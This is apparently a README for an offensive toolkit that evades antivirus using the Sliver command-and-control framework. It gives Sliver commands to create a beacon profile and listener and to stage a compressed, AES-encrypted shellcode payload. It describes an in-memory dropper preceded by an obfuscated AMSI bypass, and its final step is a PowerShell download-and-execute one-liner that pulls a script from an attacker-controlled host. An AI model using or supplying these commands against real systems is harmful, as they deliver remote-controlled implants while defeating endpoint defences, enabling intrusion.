# Bypass AV with Sliver c2

Toolkit and sample VS solution to start bypassing AV with Sliver C2 payloads.

Taken from [this article](https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8).

## In Sliver

Create new beacon profile (does not need to be HTTPS)

`profiles new --http http://10.10.14.225:8080 --format shellcode http1`

Start listener

`http -L 10.10.14.225 -l 8080`

Stage beacon payload - compress and encrypt (optional)

`stage-listener --url http://10.10.14.225:8443 --profile http1 -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV`

## Dropping In-Memory

Shellcode dropper solution will download, decompress, decrypt shellcode and execute. Best way is to reflectively load via PowerShell as it is .NET assembly after an AMSI bypass.

1. Setup your AMSI bypass. 
	- Use `AmsiTrigger` to detect flags in `am_obfs.ps1`
	- Use `Invoke-Obfuscation` to patch these
	- Update the download url in the bypass.

2. Make any modifications to the assembly that you like
	- Afterwards, grab the base64 blob and update `loader.ps1`
	- `get-content -encoding byte -path .\sliverloader.dll | clip` and then CyberChef

3. Convert any encryption keys or IVs to bytes and update `loader.ps1`

4. Execute the dropper with bypass added
	- `(New-Object Net.WebClient).DownloadString('http://10.10.14.225:1234/am_obfs.ps1) | iex`
